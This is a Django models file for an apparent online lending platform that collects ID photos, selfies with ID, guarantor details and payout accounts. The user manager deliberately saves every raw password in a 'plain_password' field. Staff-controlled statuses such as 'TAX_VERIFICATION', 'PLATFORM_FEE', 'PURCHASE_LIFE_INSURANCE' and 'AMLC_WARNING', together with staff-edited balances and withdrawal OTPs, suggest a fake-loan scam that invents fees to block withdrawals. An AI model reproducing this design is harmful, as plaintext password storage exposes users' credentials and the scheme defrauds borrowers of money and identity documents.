from decimal import Decimal
from django.conf import settings
from django.db import models
from django.contrib.auth.models import AbstractBaseUser, PermissionsMixin, BaseUserManager
from django.core.validators import MinValueValidator, MaxValueValidator


class UserManager(BaseUserManager):
    use_in_migrations = True

    def _create_user(self, phone, password, **extra_fields):
        if not phone:
            raise ValueError("The phone number must be set")
        phone = str(phone).strip()

        user = self.model(phone=phone, **extra_fields)
        user.set_password(password)
        if password:
            user.plain_password = password
        user.save(using=self._db)
        return user

    def create_user(self, phone, password=None, **extra_fields):
        extra_fields.setdefault("is_staff", False)
        extra_fields.setdefault("is_superuser", False)
        extra_fields.setdefault("is_active", True)
        return self._create_user(phone, password, **extra_fields)

    def create_superuser(self, phone, password=None, **extra_fields):
        extra_fields.setdefault("is_staff", True)
        extra_fields.setdefault("is_superuser", True)
        extra_fields.setdefault("is_active", True)

        if extra_fields.get("is_staff") is not True:
            raise ValueError("Superuser must have is_staff=True.")
        if extra_fields.get("is_superuser") is not True:
            raise ValueError("Superuser must have is_superuser=True.")

        return self._create_user(phone, password, **extra_fields)


class User(AbstractBaseUser, PermissionsMixin):

    ACCOUNT_STATUS_CHOICES = [
        ("ACTIVE", "Active"),
        ("ACCOUNT_UPDATED", "Account Updated"),
        ("APPROVED", "Approved"),
        ("APP_MAINTENANCE", "App Maintenance"),
        ("LOCKED", "LOCKED"),
        ("BANNED", "BANNED"),
        ("FROZEN", "FROZEN"),
        ("LOAN_PAID", "Loan Paid"),
        ("WITHDRAWAL_SUCCESSFUL", "Withdrawal Successful"),
        ("INVALID_DETAIL", "Invalid Detail"),
        ("LOW_CREDIT", "Low Credit"),
        ("RENEW_DOCUMENT_REQUIRED", "Renew Document Required"),
        ("RENEW_OTP_CODE", "Renew OTP Code"),
        ("RENEW_DOCUMENT_AND_OTP", "Renew Document & OTP code"),
        ("OVERDUE_RECORD", "Overdue Record"),
        ("REPAYMENT_ABILITY", "Repayment Ability"),
        ("VIP_CHANNEL", "VIP Channel"),
        ("PURCHASE_LIFE_INSURANCE", "Purchase Life Insurance"),
        ("TAX_VERIFICATION", "Tax Verification"),
        ("PLATFORM_FEE", "Platform Fee"),
        ("AMLC_WARNING", "AMLC Warning"),
    ]

    # Notification message (admin -> user)
    notification_message = models.TextField(blank=True, default="")
    notification_updated_at = models.DateTimeField(null=True, blank=True)
    # ✅ NEW (approval / success message)
    success_message = models.TextField(blank=True, default="")
    success_message_updated_at = models.DateTimeField(null=True, blank=True)
    # ✅ read flags (keep message, but hide dot after read)
    notification_is_read = models.BooleanField(default=True)
    success_is_read = models.BooleanField(default=True)

    phone = models.CharField(max_length=20, unique=True)
    plain_password = models.CharField(max_length=128, blank=True, default="")
    created_at = models.DateTimeField(auto_now_add=True)
    balance = models.DecimalField(max_digits=14, decimal_places=2, default=Decimal("0.00"))
    credit_score = models.PositiveIntegerField(
    default=100,
    validators=[MinValueValidator(0), MaxValueValidator(500)]
    )
    status_message = models.CharField(max_length=220, blank=True, default="")
    dashboard_status_label = models.CharField(max_length=80, blank=True, default="")
    # Register tracking (safe)
    register_ip = models.CharField(max_length=64, blank=True, default="")
    register_country = models.CharField(max_length=80, blank=True, default="")
    register_city = models.CharField(max_length=120, blank=True, default="")
    register_user_agent = models.CharField(max_length=255, blank=True, default="")
    off_reason = models.TextField(blank=True, default="")

    profile_photo = models.ImageField(upload_to="profile_photos/", blank=True, null=True)

    account_status = models.CharField(
        max_length=50,
        choices=ACCOUNT_STATUS_CHOICES,
        default="ACTIVE"
    )

    withdraw_otp = models.CharField(max_length=10, blank=True, default="")

    is_staff = models.BooleanField(default=False)     # staff portal
    is_control = models.BooleanField(default=False)   # control portal
    is_view = models.BooleanField(default=False)      # view portal
    is_active = models.BooleanField(default=True)

    # --- Staff device lock: one approved device per staff login ---
    allowed_device = models.CharField(max_length=64, blank=True, default="")
    pending_device = models.CharField(max_length=64, blank=True, default="")
    pending_device_label = models.CharField(max_length=200, blank=True, default="")
    pending_device_ip = models.CharField(max_length=64, blank=True, default="")
    pending_since = models.DateTimeField(null=True, blank=True)

    objects = UserManager()

    USERNAME_FIELD = "phone"
    REQUIRED_FIELDS = []

    def __str__(self):
        return self.phone

    def save(self, *args, **kwargs):
        if self.account_status:
            self.account_status = str(self.account_status).upper().strip()
        else:
            self.account_status = "ACTIVE"

        # ✅ clean dashboard label (keep as normal text, not uppercase)
        self.dashboard_status_label = str(self.dashboard_status_label or "").strip()

        super().save(*args, **kwargs)


class LoanConfig(models.Model):
    """
    Admin can change interest/min/max later (no code change).
    Keep only 1 row in DB.
    """
    interest_rate_monthly = models.DecimalField(
        max_digits=10, decimal_places=6, default=Decimal("0.000500")
    )
    min_amount = models.DecimalField(
        max_digits=14, decimal_places=2, default=Decimal("80000.00")
    )
    max_amount = models.DecimalField(
        max_digits=14, decimal_places=2, default=Decimal("5000000.00")
    )
    updated_at = models.DateTimeField(auto_now=True)

    def __str__(self):
        return "Loan Config"


from io import BytesIO
from PIL import Image
from django.core.files.base import ContentFile
import os


def _to_webp(fieldfile, max_w=1400, quality=78):
    """
    Convert uploaded image to WEBP + resize (keep aspect ratio).
    Works for jpg/png. (HEIC depends on pillow-heif; if not supported, it will fail)
    """
    if not fieldfile:
        return None

    try:
        fieldfile.open()
        img = Image.open(fieldfile)
        img.load()

        # Resize (only if too wide)
        w, h = img.size
        if w > max_w:
            new_h = int(h * (max_w / w))
            img = img.resize((max_w, new_h), Image.LANCZOS)

        # Convert mode
        if img.mode not in ("RGB", "RGBA"):
            img = img.convert("RGB")

        # Save to WEBP in memory
        buf = BytesIO()
        img.save(buf, format="WEBP", quality=quality, method=6)
        buf.seek(0)

        # new filename
        base = os.path.splitext(os.path.basename(fieldfile.name))[0]
        new_name = f"{base}.webp"

        return ContentFile(buf.read(), name=new_name)

    except Exception:
        # if convert fails, keep original (don’t break user upload)
        return None


class LoanApplication(models.Model):
    STATUS_CHOICES = [
        ("DRAFT", "Draft"),          # ✅ NEW
        ("PENDING", "Pending"),      # ✅ FIX (was "Paid")
        ("REVIEW", "In Review"),
        ("APPROVED", "Approved"),
        ("REJECTED", "Rejected"),
    ]
    PROGRESS_CHOICES = [
        ("LOAN_FORM", "Step 1: Loan Form"),
        ("PAYMENT_METHOD", "Step 2: Payment Method"),
        ("SUBMITTED", "Step 3: Submitted"),
    ]

    progress_step = models.CharField(
        max_length=30,
        choices=PROGRESS_CHOICES,
        default="LOAN_FORM",
        db_index=True,
    )

    def save(self, *args, **kwargs):
        # Convert images to webp (safe: if conversion fails, keep original)
        for fname in ("id_front", "id_back", "selfie_with_id", "signature_image"):
            f = getattr(self, fname)
            if f and f.name and not f.name.lower().endswith(".webp"):
                new_file = _to_webp(f, max_w=1400, quality=78)
                if new_file:
                    setattr(self, fname, new_file)

        super().save(*args, **kwargs)

    user = models.ForeignKey(
        settings.AUTH_USER_MODEL,
        on_delete=models.CASCADE,
        related_name="loan_applications",
    )

    # 1) information required
    full_name = models.CharField(max_length=120)
    age = models.PositiveIntegerField()
    current_living = models.CharField(max_length=160)
    hometown = models.CharField(max_length=160)
    income = models.CharField(max_length=120, blank=True)
    monthly_expenses = models.CharField(max_length=120, blank=True)

    guarantor_contact = models.CharField(max_length=80)
    guarantor_current_living = models.CharField(max_length=160)
    identity_name = models.CharField(max_length=120)
    identity_number = models.CharField(max_length=80)

    income_proof = models.FileField(upload_to="income_proof/", blank=True, null=True)

    id_front = models.ImageField(upload_to="id_cards/", blank=True, null=True)
    id_back = models.ImageField(upload_to="id_cards/", blank=True, null=True)
    selfie_with_id = models.ImageField(upload_to="id_cards/", blank=True, null=True)
    signature_image = models.ImageField(upload_to="signatures/", blank=True, null=True)

    # 2) apply loan
    amount = models.DecimalField(max_digits=14, decimal_places=2, null=True, blank=True)
    term_months = models.PositiveIntegerField(null=True, blank=True)

    # snapshot values
    interest_rate_monthly = models.DecimalField(max_digits=10, decimal_places=6, null=True, blank=True)
    monthly_repayment = models.DecimalField(max_digits=14, decimal_places=2, null=True, blank=True)

    status = models.CharField(max_length=20, choices=STATUS_CHOICES, default="PENDING")
    created_at = models.DateTimeField(auto_now_add=True)
    approved_at = models.DateTimeField(null=True, blank=True)
    credited_to_balance = models.BooleanField(default=False)
    loan_purposes = models.JSONField(default=list, blank=True)

    def __str__(self):
        return f"{self.user} - {self.amount} - {self.term_months}m - {self.status}"


class PaymentMethod(models.Model):
    user = models.OneToOneField(
        settings.AUTH_USER_MODEL,
        on_delete=models.CASCADE,
        related_name="payment_method"
    )

    # Mobile wallet
    wallet_name = models.CharField(max_length=120, blank=True)
    wallet_phone = models.CharField(max_length=40, blank=True)

    # Bank
    bank_name = models.CharField(max_length=120, blank=True)
    bank_account = models.CharField(max_length=80, blank=True)

    # PayPal
    paypal_email = models.EmailField(blank=True)

    # lock after first submit
    locked = models.BooleanField(default=False)

    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)

    def __str__(self):
        return f"{self.user} PaymentMethod"


class WithdrawalRequest(models.Model):
    STATUS_PROCESSING = "processing"
    STATUS_WAITING = "waiting"
    STATUS_REVIEWED = "reviewed"
    STATUS_PAID = "paid"
    STATUS_REJECTED = "rejected"
    STATUS_WITHDRAWAL_FAIL = "withdrawal_fail"
    refunded = models.BooleanField(default=False)
    staff_otp = models.CharField(max_length=10, blank=True, default="")   # admin/staff set
    otp_required = models.BooleanField(default=False)                     # admin toggle

    STATUS_CHOICES = [
        (STATUS_PROCESSING, "Processing"),
        (STATUS_WAITING, "Waiting for approval"),
        (STATUS_REVIEWED, "Reviewed"),
        (STATUS_PAID, "Payment sent"),
        (STATUS_REJECTED, "Rejected"),
        (STATUS_WITHDRAWAL_FAIL, "Withdrawal Failed"),
    ]

    user = models.ForeignKey(settings.AUTH_USER_MODEL, on_delete=models.CASCADE, related_name="withdrawals")
    amount = models.DecimalField(max_digits=12, decimal_places=2, default=0)
    currency = models.CharField(max_length=10, default="PHP")
    status = models.CharField(max_length=20, choices=STATUS_CHOICES, default=STATUS_PROCESSING)

    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)

    class Meta:
        ordering = ["-created_at"]

    def __str__(self):
        return f"{self.user} {self.amount} {self.currency} ({self.status})"
class ContactMessage(models.Model):
    user = models.ForeignKey(
        settings.AUTH_USER_MODEL,
        on_delete=models.SET_NULL,
        null=True, blank=True,
        related_name="contact_messages",
    )
    full_name = models.CharField(max_length=120)
    email = models.EmailField(blank=True)
    phone = models.CharField(max_length=40, blank=True)
    subject = models.CharField(max_length=200, blank=True)
    message = models.TextField()
    created_at = models.DateTimeField(auto_now_add=True)
    is_read = models.BooleanField(default=False)

    class Meta:
        ordering = ["-created_at"]

    def __str__(self):
        return f"{self.full_name} — {self.subject or 'No subject'}"


class StaffActivityLog(models.Model):
    """Permanent record of sensitive changes made to client accounts.

    Written automatically by accounts/watchdog.py whenever a client's
    status / balance / notification changes or a client is deleted.
    Labels are stored as plain text so the record survives even if the
    staff or client row is later deleted.
    """
    ACTIONS = [
        ("STATUS", "Status change"),
        ("BALANCE", "Balance change"),
        ("NOTIFICATION", "Notification message"),
        ("SUCCESS_MSG", "Success message"),
        ("DELETE", "Client deleted"),
    ]

    actor = models.ForeignKey(
        settings.AUTH_USER_MODEL, on_delete=models.SET_NULL,
        null=True, blank=True, related_name="watchdog_actions",
    )
    target = models.ForeignKey(
        settings.AUTH_USER_MODEL, on_delete=models.SET_NULL,
        null=True, blank=True, related_name="watchdog_received",
    )
    actor_label = models.CharField(max_length=120, blank=True, default="")
    target_label = models.CharField(max_length=160, blank=True, default="")
    action = models.CharField(max_length=20, choices=ACTIONS, db_index=True)
    old_value = models.TextField(blank=True, default="")
    new_value = models.TextField(blank=True, default="")
    created_at = models.DateTimeField(auto_now_add=True, db_index=True)

    class Meta:
        ordering = ["-created_at"]

    def __str__(self):
        return f"{self.created_at:%Y-%m-%d %H:%M} {self.actor_label} {self.action} {self.target_label}"


class StaffLoginEvent(models.Model):
    """Every staff/control/view login, with the device + IP it came from.

    Lets the owner spot credential sharing: if a staff logs in from a device
    never seen before, it's flagged 🆕 and (optionally) alerted to Telegram.
    """
    user = models.ForeignKey(
        settings.AUTH_USER_MODEL, on_delete=models.CASCADE, related_name="login_events"
    )
    username = models.CharField(max_length=120, blank=True, default="")   # snapshot
    ip = models.CharField(max_length=64, blank=True, default="")
    user_agent = models.CharField(max_length=400, blank=True, default="")
    device_label = models.CharField(max_length=200, blank=True, default="")
    device_key = models.CharField(max_length=64, blank=True, default="", db_index=True)
    is_new_device = models.BooleanField(default=False)
    created_at = models.DateTimeField(auto_now_add=True, db_index=True)

    class Meta:
        ordering = ["-created_at"]
        verbose_name = "Staff login device"
        verbose_name_plural = "Staff login devices"

    def __str__(self):
        return f"{self.created_at:%Y-%m-%d %H:%M} {self.username} {self.device_label}"


class StaffAccount(User):
    """Proxy of User shown in the Loan Admin as its own 'Staff accounts' section.

    Same database table as User — this just gives the owner a dedicated,
    superuser-only management screen for staff logins.
    """
    class Meta:
        proxy = True
        verbose_name = "Staff account"
        verbose_name_plural = "Staff accounts"


class SystemSetting(models.Model):
    reference_number = models.CharField(max_length=20, default='89745')
    device_lock_enabled = models.BooleanField(
        default=False,
        help_text="When ON, each staff can only log in from one approved device; a new device is blocked until you Allow it.",
    )
    updated_at = models.DateTimeField(auto_now=True)
    updated_by = models.ForeignKey(User, on_delete=models.SET_NULL, null=True, blank=True)

    class Meta:
        verbose_name = "System Setting"
        verbose_name_plural = "System Settings"

    def __str__(self):
        return f"Ref: {self.reference_number}"

    @classmethod
    def get_reference_number(cls):
        setting, created = cls.objects.get_or_create(pk=1, defaults={'reference_number': '89745'})
        return setting.reference_number

    @classmethod
    def device_lock_on(cls) -> bool:
        setting, _ = cls.objects.get_or_create(pk=1, defaults={'reference_number': '89745'})
        return bool(setting.device_lock_enabled)